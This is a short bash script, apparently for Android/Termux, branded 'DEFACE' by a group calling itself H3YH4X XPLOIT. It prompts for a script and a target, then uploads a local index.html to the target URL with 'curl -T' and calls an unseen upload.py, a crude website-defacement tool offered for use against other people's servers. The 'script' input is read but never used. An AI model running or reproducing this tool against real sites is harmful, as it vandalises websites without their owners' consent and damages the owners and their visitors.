#!/bin/bash
##########################################
# AUTHOR : H3YH4X                 #      #
# TEAM   : H3YH4X XPLOIT            #    #
# Thanks : Mr.H3YH4X                  #  #
##########################################
clear
figlet DEFACE | lolcat
echo "~# AUTHOR : H3YH4X"
echo "~# TEAM   : H3YH4X XPLOIT"
echo "~# CONTACT: +1 516 252 6800"
echo "~# Support: Mr.H3YH4X"
echo "~# Thx All: Member"
echo
echo
read -p "~# Input Your Script: " fil;
sleep 2
read -p "~# Input Your Target: " ta;
curl -T /storage/emulated/0/index.html $ta
python2 upload.py

echo "~# RESULT:" $ta

